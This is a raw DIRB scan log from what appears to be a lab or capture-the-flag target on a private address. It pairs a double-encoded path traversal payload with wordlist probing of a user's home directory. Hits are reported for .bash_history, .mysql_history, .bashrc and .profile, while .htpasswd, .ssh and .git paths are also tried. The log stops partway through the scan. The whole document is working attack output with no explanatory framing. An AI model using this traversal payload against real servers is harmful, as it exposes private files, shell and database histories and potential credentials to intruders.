
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul  5 01:20:13 2025
URL_BASE: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

*** Generating Wordlist...
                                                                               
GENERATED WORDS: 4612

---- Scanning URL: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ ----
*** Calculating NOT_FOUND code...
                                                                               
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bash_history
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bash_history (CODE:200|SIZE:380)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bashrc
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bashrc (CODE:200|SIZE:3526)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.cache
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.config
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.cvs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.cvsignore
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.forward
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.git/HEAD
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.history
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.hta
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.htaccess
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.htpasswd
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.listing
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.listings
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.mysql_history
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.mysql_history (CODE:200|SIZE:142)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.passwd
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.perf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.profile
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.profile (CODE:200|SIZE:807)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.rhosts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.sh_history
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.ssh
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.subversion
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.svn
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.svn/entries
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.swf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.web
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/@
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_adm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_admin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_ajax
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_archive
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_assets
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_backup
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_baks
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_borders
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_cache
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_catalogs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_code
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_common
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_conf
                                                                                                                                                                                             
